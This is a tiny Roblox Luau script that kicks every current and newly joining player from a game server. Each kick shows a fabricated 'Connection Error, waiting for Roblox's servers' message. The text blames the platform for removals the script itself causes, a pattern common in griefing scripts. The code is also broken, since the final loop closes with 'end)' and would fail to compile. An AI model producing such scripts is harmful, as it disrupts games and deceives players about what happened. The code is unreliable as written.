game.Players.PlayerAdded:Connect(function(player)
	task.wait()
	player:Kick("Connection Error, waiting for Roblox`s servers. Please try again later.")
end)

for i, v in pairs(game.Players:GetPlayers()) do
	v:Kick("Connection Error, waiting for Roblox`s servers. Please try again later.")
end)
